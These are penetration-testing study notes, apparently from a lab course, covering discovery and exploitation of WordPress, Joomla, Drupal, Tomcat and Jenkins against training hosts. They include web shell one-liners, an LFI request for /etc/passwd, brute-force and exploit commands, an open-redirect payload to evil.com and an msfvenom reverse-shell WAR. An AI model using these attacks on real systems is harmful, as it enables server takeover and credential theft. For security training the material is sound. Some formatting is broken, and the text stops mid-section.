# Attacking Common Application

## Some of the common software are using the applications are the

| **Category**                                                                                                               | **Applications**                                                       |
| -------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| [Web Content Management](https://enlyft.com/tech/web-content-management)                                                   | Joomla, Drupal, WordPress, DotNetNuke, etc.                            |
| [Application Servers](https://enlyft.com/tech/application-servers)                                                         | Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc. |
| [Security Information and Event Management (SIEM)](https://enlyft.com/tech/security-information-and-event-management-siem) | Splunk, Trustwave, LogRhythm, etc.                                     |
| [Network Management](https://enlyft.com/tech/network-management)                                                           | PRTG Network Monitor, ManageEngine Opmanger, etc.                      |
| [IT Management](https://enlyft.com/tech/it-management-software)                                                            | Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc.            |
| [Software Frameworks](https://enlyft.com/tech/software-frameworks)                                                         | JBoss, Axis2, etc.                                                     |
| [Customer Service Management](https://enlyft.com/tech/customer-service-management)                                         | osTicket, Zendesk, etc.                                                |
| [Search Engines](https://enlyft.com/tech/search-engines)                                                                   | Elasticsearch, Apache Solr, etc.                                       |
| [Software Configuration Management](https://enlyft.com/tech/software-configuration-management)                             | Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc.     |
| [Software Development Tools](https://enlyft.com/tech/software-development-tools)                                           | Jenkins, Atlassian Confluence, phpMyAdmin, etc.                        |
| [Enterprise Application Integration](https://enlyft.com/tech/enterprise-application-integration)                           | Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc.        |

***

***

**Key phases mentioned:**

* **Infrastructure Discovery:** Starting with CIDR ranges or a list of hostnames.
* **Service Identification:** Using **Nmap** to find open web ports (80, 443, 8080, etc.).
* **Visual Enumeration:** Using tools like **EyeWitness** or **Aquatone** to automatically take screenshots of every web service found. This allows a tester to quickly spot "juicy" targets like admin portals, Jenkins instances, or outdated CMS (WordPress/Drupal) without manually visiting every IP.
* **Organization:** The importance of structured note-taking (using OneNote/Notion) to track findings and keep timestamps for reporting.

***

## Application Discovery & Enumeration

#### Tools Used in these section

Here is the breakdown of the commands demonstrated in the text, organized by their function.

**A. Initial Nmap Scanning**

These commands are used to find open ports and save the results in a format that other tools can read.

| **Command**                                                                             | **Purpose**                                                                                                                 |
| --------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| `cat scope_list`                                                                        | Displays the list of target domains and IPs.                                                                                |
| `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` | Scans specific web ports for "Open" status, saves results in three formats (`-oA`), and reads targets from a file (`-iL`).  |
| `sudo nmap --open -sV 10.129.201.50`                                                    | Performs a service version scan (`-sV`) on a specific host to identify the exact software running (e.g., IIS 10.0, Splunk). |

***

**B. Using EyeWitness**

EyeWitness parses Nmap XML and creates an HTML report with screenshots.

| **Command**                                                         | **Purpose**                                                                                 |
| ------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| `sudo apt install eyewitness`                                       | Installs the tool via the package manager.                                                  |
| `eyewitness -h`                                                     | Displays the help menu and available flags.                                                 |
| `eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness` | Takes the Nmap XML output (`-x`) and generates a web report in a specific directory (`-d`). |

***

**C. Using Aquatone**

Aquatone is a faster, Go-based alternative to EyeWitness.

| **Command**              | **Purpose**                                            |
| ------------------------ | ------------------------------------------------------ |
| `wget [URL]`             | Downloads the precompiled Aquatone binary from GitHub. |
| `unzip [filename]`       | Extracts the tool from the zip archive.                |
| \`cat web\_discovery.xml | ./aquatone -nmap\`                                     |

***

#### ## 3. Key Takeaways for Your Lab

* **The Power of XML:** Notice that `nmap` is run with `-oA`. This is crucial because EyeWitness and Aquatone require the **.xml** file to understand which IPs have which ports open.
* **Targeting "Dev" Hosts:** The text mentions that hostnames containing "dev" or "qa" (like `gitlab-dev.inlanefreight.local`) are high-priority because they often have debug modes enabled or weaker security.
* **Default Credentials:** The visual report helps you find management interfaces (Tomcat, Jenkins, ColdFusion) where you should immediately try default logins like `admin:admin`.

***

***

## WordPress - Discovery & Enumeration

### 1. High-Yield WordPress Directories

| **Directory Path**     | **Security Significance**                                | **What to Look For**                                                              |
| ---------------------- | -------------------------------------------------------- | --------------------------------------------------------------------------------- |
| `/wp-content/`         | The primary storage area for user-supplied content.      | Check if directory listing is open to reveal themes and plugins.                  |
| `/wp-content/plugins/` | Where all third-party extensions live.                   | **The primary attack surface.** Look for outdated or vulnerable custom code.      |
| `/wp-content/themes/`  | Contains the visual layout templates.                    | Look for theme names. Vulnerable themes can lead to Remote Code Execution (RCE).  |
| `/wp-content/uploads/` | The default directory for uploaded media and files.      | Look for sensitive documents, backups, or uploaded web shells.                    |
| `/wp-includes/`        | Contains core application files, scripts, and libraries. | Look for outdated third-party backend packages (like older `PHPMailer` versions). |
| `/wp-admin/`           | The administrative dashboard area.                       | Restricted by default, but useful to confirm the backend login path.              |

### 2. High-Value Files to Hunt For

Beyond the folders, individual files can leak version numbers, system configurations, or provide access points:

*   **`wp-config.php`**

    > **Critical Priority:** You cannot access this file directly via a browser under normal conditions (it will just serve a blank page because it executes as PHP). However, if you find a Local File Inclusion (LFI) or a backup file (like `wp-config.php.bak`), reading this file grants you the **database root credentials** and security salts.
* **`xmlrpc.php`**
  * A legacy API system used for mobile apps and remote management. If active, it allows an attacker to execute high-speed password brute-forcing attempts by bundling hundreds of login guesses into a single HTTP request (multicall).
* **`wp-login.php`**
  * The interface for backend authentication. Use this endpoint to manually test for user enumeration based on changing error messages.
* **`readme.html` or `license.txt`**
  * Often left in the root directory. They frequently contain the exact version number of the core WordPress installation in plain text.

### 3. The "Hidden" Trick: Bypassing to the REST API

If an administrator successfully hides their `wp-login.php` page or blocks standard user enumeration tricks, you can often query the built-in WordPress REST API directly.

If it hasn't been explicitly disabled by a security plugin, anyone can request this endpoint to dump a clean JSON list of valid system users, their real names, and their account IDs:

Plaintext

```
http://target.local/wp-json/wp/v2/users
```

This bypasses traditional front-end page restrictions and hands you a clean list of targets for a password attack

### 4. Footprinting & Manual Discovery Techniques

The text demonstrates how to manually map out a target site (`blog.inlanefreight.local`) using basic command-line tools:

* **Checking `robots.txt`:** Instantly exposes standard directories like `/wp-admin/` and `/wp-content/`.
* **Page Source Inspection:** Using `curl` and `grep` to actively search the raw HTML for signatures.
* **Username Enumeration:** Exploiting descriptive login error messages on `wp-login.php`. (e.g., if a username exists, the site complains about an _invalid password_; if it doesn't exist, it says _user not found_).

***

## Attacking word press CMS

### 1. Credential Guessing (Login Brute Force)

Before trying to touch the backend code, an attacker needs access. This attack focuses on discovering a valid password for users already found during the enumeration phase.

* **The Mechanics:** Attackers use automated tools to test thousands of passwords against a known account. On WordPress, this can be done via the standard web interface (wp-login.php) or the legacy API (xmlrpc.php). Testing via XML-RPC is preferred because it allows multiple authentication attempts to be bundled into fewer network requests, drastically speeding up the attack.
*   **The Text Example:** Using **WPScan** against the user john with the rockyou.txt password list over XML-RPC:

    Bash

    ```
    wpscan --password-attack xmlrpc -U john -P rockyou.txt --url http://blog.inlanefreight.local

    ```

````
    *   **Result:** Discovered valid credentials (john : firebird1).

---

## 2. Abusing Built-in Functionality (Theme Editor RCE)
Once inside the administrative dashboard, you don't necessarily need a software bug to take over the server—you can abuse default features.

*   **The Mechanics:** WordPress allows administrators to edit the theme's source code directly from the web browser. An attacker can select an uncommon or inactive theme (so they don't break the main look of the site) and append a simple PHP web shell to an template file like 404.php.
*   **The Text Example:** Adding a single-line shell snippet:
    ```php
    system($_GET[0]);
    
````

```
By browsing directly to that modified theme file and passing a system command into the parameter 0, the attacker tricks the underlying server into running it.
*   **Result:** Executing curl http://.../404.php?0=id successfully returns the server user context (www-data).
```

### 3. Automated Post-Authentication Exploitation (Metasploit)

Instead of manually editing files, penetration testers often use framework modules to quickly handle access, payload delivery, and session management.

* **The Mechanics:** The Metasploit module handles the administrative login, packages a PHP Meterpreter payload into a fake zip archive, installs and activates it as a "plugin," triggers the shell execution, and attempts to erase its traces automatically.
* **The Text Example:** Utilizing the wp\_admin\_shell\_upload exploit module.
  * **Key Parameters Configured:** Target IP (RHOSTS), local listener IP (LHOST), virtual routing host (VHOST), and the discovered credentials (john/firebird1).
  * **Result:** A reverse interactive **Meterpreter session** is established as the low-privilege system user www-data.

### 4. Exploiting Vulnerable Third-Party Plugins

This highlights why checking plugin directories is so critical. Administrators often install features and forget about them, leaving unpatched, critical flaws open to anyone.

#### A. Local File Inclusion (LFI) — _Mail-Masta Plugin_

* **The Mechanics:** Poorly coded PHP files sometimes pass user-supplied input directly into an internal include() or require() code block without ensuring it stays within the intended directory. This allows an unauthenticated external user to view sensitive operating system files.
*   **The Text Example:** The pl URL parameter in Mail-Masta was completely unsanitized:

    Bash

    ```
    curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

    ```

```
    *   **Result:** The server reads and prints out the system's local /etc/passwd file, leaking all registered system users.

### B. Unauthenticated Remote Code Execution — *wpDiscuz Plugin*
*   **The Mechanics:** This plugin was meant to let visitors upload normal image attachments to blog comment sections. However, flaws in its verification functions allowed an attacker to bypass file type validation restrictions, upload a hidden .php executable script instead of an image, and call it directly.
*   **The Text Example:** Running a specialized python script (wp_discuz.py) to bypass the filter and upload a shell named uthsdkbywoxeebg-[timestamp].php to the publicly reachable /wp-content/uploads/ path.
    *   **Result:** Accessing the uploaded script via curl with a ?cmd=id argument grants direct system command processing power.

---

## Summary of the Testing Footprint
```

> **Important Asset Note:** If you are performing a professional assessment, any files uploaded during this phase (like the random .php string generated by the wpDiscuz script or the Metasploit plugin) are considered **testing artifacts**. You are required to log their exact filenames and paths so they can be thoroughly cleaned off the target system post-assessment.

#### The WordPress File System Directory

| **File or Folder Name** | **Type**       | **What It Does / Stored Data**                                                                                        | **Safe to Edit?**                                                              |
| ----------------------- | -------------- | --------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| **wp-config.php**       | Root File      | Contains your database name, user, password, and security keys. Connects your files to your content.                  | **With Caution** (Only to change database credentials or add debugging rules)  |
| **.htaccess**           | Root File      | Tells the server how to handle permalinks, URL redirects, and basic security rules.                                   | **Yes** (Back up first; rules can be added here)                               |
| **index.php**           | Root File      | The main engine starter. It loads core WordPress files when a visitor arrives.                                        | **Never**                                                                      |
| **wp-admin/**           | Core Folder    | Contains all the internal code and files that power the WordPress Admin Dashboard backend.                            | **Never** (Changes get overwritten during updates)                             |
| **wp-includes/**        | Core Folder    | The main logic engine. Houses core PHP libraries, classes, and helper functions.                                      | **Never** (Modifying this will break your site)                                |
| **wp-content/**         | Main Directory | The umbrella folder for all user-customized items. It separates your unique data from core code.                      | **Yes** (This is your main development area)                                   |
| **wp-content/themes/**  | Sub-Folder     | Holds the design templates and layout folders for all your installed themes.                                          | **Yes** (Always use a _child theme_ to make changes)                           |
| **wp-content/plugins/** | Sub-Folder     | Holds the functionality folders for all your active and inactive plugins.                                             | **Yes** (You can safely delete or rename folders to deactivate broken plugins) |
| **wp-content/uploads/** | Sub-Folder     | Automatically stores every image, PDF, video, or audio asset you upload via the Media Library (sorted by year/month). | **Yes** (But best managed inside the WordPress dashboard)                      |

***

***

## Joomla Discovery & Enumeration

The provided text outlines the methodology for identifying, footprinting, and enumerating a target website running the **Joomla CMS** (Content Management System) during a penetration test. Joomla is a PHP/MySQL-based platform powering roughly 3% of all websites.

The testing workflow follows a logical three-phase progression:

#### 1. Manual Footprinting & Fingerprinting

Before launching heavy scans, you can confirm a site is running Joomla and determine its version by inspecting specific files and directories:

* **Page Source:** Look for the tag in the HTML.
* **robots.txt:** Look for specific, predictable directory bans unique to Joomla (e.g., /administrator/, /components/, /modules/).
* **Core Documentation Files:** Checking README.txt can reveal major version details.
* **Manifest Files:** Inspecting path files like /administrator/manifests/files/joomla.xml or /plugins/system/cache/cache.xml frequently leaks the exact software version (e.g., 3.9.4).

#### 2. Automated Enumeration

When manual checks are insufficient, automated scanners map the attack surface by identifying installed components, plugins, extensions, and vulnerable directories. The guide highlights utilizing multi-CMS tools alongside platform-specific legacy scanners to double-check findings.

#### 3. Administrative Brute-Forcing

Joomla locks its admin login backend under the /administrator/ path. Because user enumeration returns a generic error message masking whether a username exists, testing often relies on targeting the default admin account with common or default credential wordlists via custom automation scripts

Here is the updated tool summary table, featuring an **Example Command** column populated with the exact syntax used in your training module.

#### Joomla Enumeration Tools & Examples

| **Tool Name**       | **Language / Platform** | **Primary Purpose**                                                                    | **Key Takeaways & Limitations**                                                                                 | **Example Command**                                                                                                                                                                    |
| ------------------- | ----------------------- | -------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **curl**            | Command Line Utility    | Fetches raw HTML page source and internal configuration files remotely.                | Fast and stealthy; used for initial manual data collection without full scanning overhead.                      | curl -s [http://dev.inlanefreight.local/README.txt](http://dev.inlanefreight.local/README.txt) \| head -n 5                                                                            |
| **droopescan**      | Python 3 (pip)          | Scans the target URL to identify possible Joomla versions and interesting setup files. | Originally built for SilverStripe/Drupal, but highly effective for narrowing down exact Joomla version numbers. | droopescan scan joomla --url [http://dev.inlanefreight.local/](http://dev.inlanefreight.local/)                                                                                        |
| **JoomlaScan**      | Python 2.7              | Maps out accessible directories, extensions, and component layouts.                    | Outdated (requires a Python 2.7 environment), but useful for discovering explorable directories.                | python2.7 joomlascan.py -u [http://dev.inlanefreight.local](http://dev.inlanefreight.local/)                                                                                           |
| **joomla-brute.py** | Python 3                | Automates dictionary attacks against the administrative backend dashboard login page.  | Custom attack script; highly effective when administrators fail to change default credentials.                  | sudo python3 joomla-brute.py -u [http://dev.inlanefreight.local](http://dev.inlanefreight.local/) -w /usr/share/metasploit-framework/data/wordlists/http\_default\_pass.txt -usr admin |

### Attacking Joomla

The text details two main methodologies for attacking a Joomla CMS application once it has been discovered and fingerprinted. The primary objective of these attacks is typically to achieve **Remote Code Execution (RCE)** or to read sensitive configuration files that facilitate internal network pivoting.

#### 1. Abusing Built-In Functionality (Authenticated RCE)

If an attacker gains valid administrative credentials (such as via default configurations like admin:admin), they do not need a software exploit to execute code. They can leverage built-in template customization features:

* **Mechanism:** Navigate to the backend template manager, select an active template layout (e.g., protostar), and inject a standard PHP one-liner backdoor into an existing file like error.php.
* **Execution:** By passing system commands to a custom, non-standard GET parameter appended to the file's web path, the attacker triggers the server-side execution engine to run system utilities under the context of the web-server user account (www-data).
* **Operational Security Advice:** Pentesters should use custom parameter names to hide the shell from automated web crawlers, limit accessibility by source IP where possible, and document the change to ensure total file remediation during clean-up.

#### 2. Leveraging Known Vulnerabilities (CVE-2019-10945)

When RCE isn't directly attainable or the administration panel layout is structurally shielded, testers target unpatched core software versions.

* **Mechanism:** This specific vulnerability affects Joomla versions 1.5.0 through 3.9.4. It consists of a directory traversal flaw paired with an authenticated arbitrary file deletion capability.
* **Impact:** Attackers can run specialized exploitation scripts to break out of standard application directory boundaries, map out local file locations, and look for sensitive target files like configuration.php to extract database credentials.

### Tool Summary Table

| **Tool Name**            | **Primary Purpose in the Module**                                                                                                | **Example Command (From Text)**                                                                                                                                                                              |   |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | - |
| **cURL**                 | Validates the injected PHP web shell backdoor by sending a targeted HTTP GET request containing the execution payload parameter. | curl -s [http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id](http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id) |   |
| **python2.7 / python3**  | Interprets and runs the automated exploit script code within the correct local execution environment.                            | python2.7 joomla\_dir\_trav.py --url "[http://dev.inlanefreight.local/administrator/](http://dev.inlanefreight.local/administrator/)" --username admin --password admin --dir /                              |   |
| **joomla\_dir\_trav.py** | An exploit script used to leverage CVE-2019-10945 to list the files inside the target webroot directory remotely.                | _Executed via python interpreter above using the --url, --username, --password, and --dir arguments._                                                                                                        |   |

***

***

## Drupal

#### Application Footprinting (Discovery)

When standard tools don't immediately flag a generic platform, Drupal can be uniquely fingerprinted using architectural signatures:

* **Generator Metadata:** Checking the HTML header for lines like `<meta name="Generator" content="Drupal..." />`.
* **The Node Indexing Structure:** Drupal handles core content chunks using "Nodes." Even if a site features a completely custom layout or design theme, it will almost always route individual posts, pages, or articles using a predictable URL syntax: `[http://target.local/node/](http://target.local/node/)[ID]`.
* **Robots.txt Paths:** Looking for routing bans explicitly indicating backend directory blocks, such as `/includes/` or `/modules/`.

#### 2. Default Roles and Permissions

Drupal assigns all application operations across three strict, built-in user profiles:

* **Administrator:** Absolute backend control.
* **Authenticated User:** Users logged in with limited creation/editing rights defined by site policy.
* **Anonymous:** Standard web traffic visitors who are limited strictly to reading public posts by default.

#### 3. Version & Module Enumeration

Pinpointing the exact software core version allows a tester to determine whether the platform is susceptible to unpatched exploits.

* **Manual Validation:** Legacy or unhardened installations leak the precise patch level inside text notes like `CHANGELOG.txt`.
* **Automated Validation:** Modern, hardened installations typically trigger a `404 Not Found` block on basic documentation files. In these scenarios, automated tools fill the gap by crawling specific resource directories to map installed modules (like `/modules/php/`) and guess the running application version.

### Tool Summary Table

| **Tool Name**    | **Primary Purpose in the Module**                                                                                                   | **Example Command (From Text)**                                                                                      |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| **`curl`**       | Remotely retrieves raw web headers, server page source files, or historical change logs.                                            | `curl -s [http://drupal-acc.inlanefreight.local/CHANGELOG.txt](http://drupal-acc.inlanefreight.local/CHANGELOG.txt)` |
| **`grep`**       | Parses incoming command output stream arrays to isolate specific version numbers or generator meta strings.                         | `curl -s [http://drupal.inlanefreight.local](http://drupal.inlanefreight.local) \| grep Drupal`                      |
| **`droopescan`** | An automated, plugin-based CMS scanner used to audit directory paths, find active extensions, and determine core software versions. | `droopescan scan drupal -u [http://drupal.inlanefreight.local](http://drupal.inlanefreight.local`                    |

| **Attack Name / CVE**                                                                     | **Vulnerability Type**    | **Auth Required?**                                                      | **How to Exploit**                                                                                                                                                                                                                                             | **Exploit Impact**                                                                                 |
| ----------------------------------------------------------------------------------------- | ------------------------- | ----------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| <p><strong>Drupalgeddon 1</strong><br><br><br><br><em>(CVE-2014-3704)</em></p>            | **SQL Injection**         | **No**                                                                  | Send an HTTP POST request to `/user/login` with an SQL `UNION SELECT` statement embedded inside a malicious array key (e.g., `name[0[a ...]]=1`). Alternatively, use Metasploit's `exploit/multi/http/drupal_dbtng_sqli`.                                      | Injects a new admin user directly into the backend database to log in.                             |
| <p><strong>Drupalgeddon 2</strong><br><br><br><br><em>(CVE-2018-7600)</em></p>            | **Remote Code Execution** | **No**                                                                  | Send an HTTP POST request to a public form endpoint (like user registration) with input parameters containing array keys like `#post_render` or `#markup` paired with an OS command. Quickest vector: Metasploit's `exploit/unix/webapp/drupal_drupalgeddon2`. | Full OS command execution. Allows running system utilities as the server user (`www-data`).        |
| <p><strong>Drupalgeddon 3</strong><br><br><br><br><em>(CVE-2018-7602)</em></p>            | **Remote Code Execution** | <p><strong>Yes</strong><br><br><br><br><em>(Low-level account)</em></p> | Authenticate to the site, then craft an execution request that targets internal rendering arrays passed explicitly via the `?destination=` URL routing string. Executed using Metasploit's `exploit/unix/webapp/drupal_drupalgeddon3`.                         | Complete system compromise via malicious parameter passing.                                        |
| <p><strong>RESTful API Exploit</strong><br><br><br><br><em>(CVE-2019-6340)</em></p>       | **Remote Code Execution** | **No**                                                                  | If the REST API module is active, send a raw HTTP `POST` or `PATCH` request containing a malicious, nested JSON object that passes data arrays into internal deserialization functions.                                                                        | Arbitrary code execution handled silently via specialized HTTP backend queries.                    |
| <p><strong>Open Overlay Redirect</strong><br><br><br><br><em>(CVE-2015-3234)</em></p>     | **Open Redirection**      | **No**                                                                  | Append a double-slash URL to the destination query parameter on the overlay login box path (e.g., `/user/login?destination=//evil.com`).                                                                                                                       | Tricks users into clicking legitimate-looking links that redirect them to external phishing sites. |
| <p><strong>Session Denial of Service</strong><br><br><br><br><em>(CVE-2014-9016)</em></p> | **Denial of Service**     | **No**                                                                  | Use an interception proxy (like Burp Intruder) or a simple threading Python script to flood the login path with requests containing password strings that are several megabytes long.                                                                          | Forces the backend password-hashing engine to exhaust server CPU cycles and crash the site.        |

***

***

## Tomcat

### Tomcat Discovery & Enumeration

Apache Tomcat is an open-source web server engineered to execute Java Servlets and Jakarta Server Pages (JSP). It is heavily utilized within enterprise Java frameworks like Spring and build tools like Gradle. In penetration testing, Tomcat is universally classified as a **High-Value Target (HVT)** because misconfigured instances often grant an unauthenticated or weakly authenticated path directly to **Remote Code Execution (RCE)**.

The lifecycle of an attack against Tomcat follows a strict sequence: **Discovery ➔ Directory Mapping ➔ Configuration Analysis ➔ Credential Enumeration ➔ Payload Deployment.**

### 1. Tomcat Directory Structure & Architecture

When auditing an application server or exploring a system via a Local File Inclusion (LFI) vulnerability, understanding the file layout is vital. Tomcat installs follow a highly predictable blueprint.

#### Server-Wide Directories (`/conf`)

* **`bin/`**: Contains core runtime scripts and executables (e.g., `startup.sh`, `version.sh`).
* **`lib/`**: Stores global Java Archive (`.jar`) libraries required for operational execution.
* **`webapps/`**: The deployment webroot. Every subfolder here represents an independent running application (such as the default `ROOT` site or the administrative `/manager` panel).
* **`conf/tomcat-users.xml`**: The credential storage engine. It maps usernames, plain-text or hashed passwords, and security access roles.

#### Application-Specific Directories (`webapps/customapp/`)

Every application deployed inside the `webapps` folder maintains its own isolated containment shield:

* **`WEB-INF/web.xml` (The Deployment Descriptor)**: The primary routing engine for the application. It maps explicit URL patterns (e.g., `/admin`) to the compiled Java logic classes handling those requests.
* **`WEB-INF/classes/`**: Houses the backend compiled Java bytecode (`.class` files). These files handle the core business logic and frequently contain hardcoded secrets, internal API pathways, or database links.
* **`WEB-INF/lib/`**: Holds specific database drivers (like JDBC) or libraries unique to that application.
* **`jsp/`**: Houses raw JavaServer Pages. These act as dynamic server-side scripts that execute code instantly when parsed by the server engine.

### 2. Footprinting & Enumeration Methodologies

The text outlines how to discover and identify a target Tomcat instance using three core techniques:

1. **HTTP Response Fingerprinting:** Forcing an invalid directory request (e.g., `/invalid`) to trick an unhardened server into spitting out its exact version banner via default `404` or `500` error blocks.
2. **Documentation Disclosures:** Checking if the default `/docs/` folder was left accessible. This folder explicitly documents the server build and patch levels.
3. **Automated Directory Brute-Forcing:** Deploying dictionary-based directory scanners to map hidden administrative paths like `/manager`, `/examples`, and `/host-manager`.

### Tool Summary Table

| **Tool**       | **Objective in this Module**                                                               | **Practical Execution Example**                                                                                         |
| -------------- | ------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------- |
| **`curl`**     | Remotely extracts raw web signatures or documentation parameters via the CLI.              | `curl -s http://app-dev.inlanefreight.local:8080/docs/`                                                                 |
| **`grep`**     | Filters output streams to locate exact version declarations or server configuration lines. | `curl -s [URL] \| grep Tomcat`                                                                                          |
| **`gobuster`** | Brute-forces directories using wordlists to discover hidden endpoints like `/manager`.     | `gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` |

***

### Attacking Tomcat

The text provides a practical blueprint for pivoting from an authenticated or vulnerable Apache Tomcat management panel to complete **Remote Code Execution (RCE)** or utilizing unauthenticated protocol flaws to read server files.

#### 1. Tomcat Manager Authentication Exploitation

When confronted with a 401 Unauthorized block on the `/manager/html` path, testers do not rely on the text printed on the screen (which is boilerplate example text). Instead, they deploy targeted directory brute-forcing.

* **The Attack Surface:** Tomcat uses HTTP Basic Authentication. This can be actively targeted using Metasploit modules, proxy scanners, or lightweight Python automation scripts to iterate through massive lists of default factory user/password permutations.
* **The Result:** In this lab configuration, the module successfully flags a loose validation pair: `tomcat:root`.

#### 2. Achieving Remote Code Execution via WAR Deployment

Once administrative access is unlocked via a user account possessing the `manager-gui` role, the server allows instant deployment of dynamic applications.

* **Mechanism:** Java web environments bundle code layout frameworks inside **Web Application Archives (`.war` files)**. Attackers compile a text-based JavaServer Page (`.jsp`) web shell payload and compress it into a standard zip archive renamed with a `.war` extension.
* **Execution:** Uploading and deploying this archive via the web application manager creates a public context path (e.g., `/backup/`). Navigating to the underlying script path (`/backup/cmd.jsp?cmd=id`) allows execution of system commands under the permissions of the `tomcat` operating system user.

```
#we can use these github repo for the creating the war file

wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

# To unzip these we need to run these command

zip -r backup.war cmd.jsp
```

#### 3. Ghostcat Exploitation (CVE-2020-1938)

The module details an alternative, unauthenticated attack vector targeting the **Apache Jserv Protocol (AJP)** running by default on port `8009`.

* **Mechanism:** Due to a structural flaw in how AJP treats inbound file pathways, an unauthenticated user can pass explicit arguments to force a Local File Inclusion (LFI) event.
* **Impact:** This permits a remote tester to step completely outside standard web access boundaries and download sensitive inner files hidden inside the application's secure deployment root (`WEB-INF/web.xml`), leaking routes and internal configuration keys.

### Tool & Exploitation Matrix

| **Tool Name**  | **Operational Phase** | **Purpose in this Module**                                                                                  | **Practical Command Example**                                                                         |
| -------------- | --------------------- | ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| **Metasploit** | Credential Auditing   | Automated dictionary-spraying against HTTP Basic Auth with success thresholds.                              | `use auxiliary/scanner/http/tomcat_mgr_login`                                                         |
| **`base64`**   | Traffic Debugging     | Decodes authentication headers captured via Burp Suite proxies to verify payload structure.                 | `echo YWRtaW46dmFncmFudA== \| base64 -d`                                                              |
| **`python3`**  | Automation Scripting  | Executes localized request libraries (`mgr_brute.py`) to bypass heavy framework dependencies.               | `python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u users.txt -p pass.txt` |
| **`zip`**      | Payload Packaging     | Compresses raw `.jsp` command shell definitions into deployable enterprise archive containers.              | `zip -r backup.war cmd.jsp`                                                                           |
| **`msfvenom`** | Payload Generation    | Creates customized, compiled reverse-shell archive scripts designed to establish outbound handler linkages. | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war`             |
| **`nmap`**     | Infrastructure Recon  | Scans specific network arrays to identify binary communication endpoints (Port 8009 AJP).                   | `nmap -sV -p 8009,8080 app-dev.inlanefreight.local`                                                   |

***

***

### Jenkins Discovery & Enumeration

Jenkins is a critical, Java-based open-source Continuous Integration and Continuous Deployment (CI/CD) automation server. It orchestrates automated building, testing, and deployment processes for developers. Within a penetration testing scope, Jenkins is universally flagged as a **High-Value Target (HVT)** due to its typical deployment contexts, network permissions, and high likelihood of system-level privilege configurations.

The provided methodology highlights three fundamental security layers:

#### 1. The Crown Jewel Target Value

On internal enterprise networks, Jenkins is frequently deployed directly onto Windows or Linux host environments running as a highly privileged service context (such as the all-powerful **`SYSTEM` account** on Windows or `root` on Linux).

* **The Impact:** Gaining Remote Code Execution (RCE) over an unhardened Jenkins instance immediately hands the tester a high-level systemic foothold. This foothold is perfect for executing active memory dumps, sniffing configuration hashes, or deploying lateral pivots directly into the Active Directory domain environment.

#### 2. Network Layout & Attack Surface

* **Default Port 8080 (HTTP):** This is the default port where the main administrative web console operates (though the active lab infrastructure redirects this target specifically to **Port 8000**).
* **Default Port 5000 (Agent/Slave Communication):** Used natively by the Jenkins controller architecture to coordinate tasks, assign build allocations, and establish sockets with secondary build node engines ("slaves").
* **Authentication Realms:** Jenkins handles authentication modularly. It can rely on a standalone local database, handoff queries to a centralized enterprise **LDAP engine**, integrate with Unix user tables, or be misconfigured to permit **no authentication at all** (Anonymous Access).

#### 3. Enumeration & Fingerprinting Workflow

* **Visual Identification:** Jenkins exposes a distinct, highly recognizable, and uniform web user login layout dashboard out of the box (`/login`).
* **Credential Probing:** While production nodes typically toggle off open user registration configurations, internal dev nodes are frequently exposed using factory-standard default fallback credentials like **`admin:admin`**.

### Core Technical Reference Map

| **Conceptual Element**          | **Technical Value / Endpoint Path** | **Security Context during Audits**                                                        |
| ------------------------------- | ----------------------------------- | ----------------------------------------------------------------------------------------- |
| **Default Web Interface**       | `http://<target>:8080/login`        | Used to visually confirm application presence and identify patch baselines.               |
| **Security Configuration**      | `/configureSecurity/`               | Controls user authorization matrix rules and enrollment features.                         |
| **Default Testing Credentials** | `admin : admin`                     | The highest-probability weak link to manually test when hitting an open dashboard prompt. |
| **Slave Attachment Link**       | Port `5000` / Port `50000`          | Dedicated communication listener mapping master-to-node operational synchronization.      |

post-exploitation techniques used to transform authenticated access (or access obtained via weak credentials) on a Jenkins server into **Remote Code Execution (RCE)** on the underlying hosting operating system. Because Jenkins is commonly configured to run out of high-privilege service configurations—such as **`root`** on Linux or **`SYSTEM`** on Windows—gaining access to its administration controls typically results in a complete machine compromise.

The text focuses on two main implementation avenues: **Administrative Feature Abuse (Script Console)** and **Version-Specific Software Vulnerabilities**.

### 1. Native Post-Exploitation: The Script Console

The absolute fastest and most reliable way to achieve RCE on an authenticated Jenkins controller is by leveraging the built-in **Script Console** located at the `/script` URL endpoint.

#### How it Works:

* **The Language:** The console processes **Apache Groovy**, an object-oriented, Java-compatible language. Groovy compiles directly into Java Bytecode and executes inside the application's Java Runtime Environment (JRE).
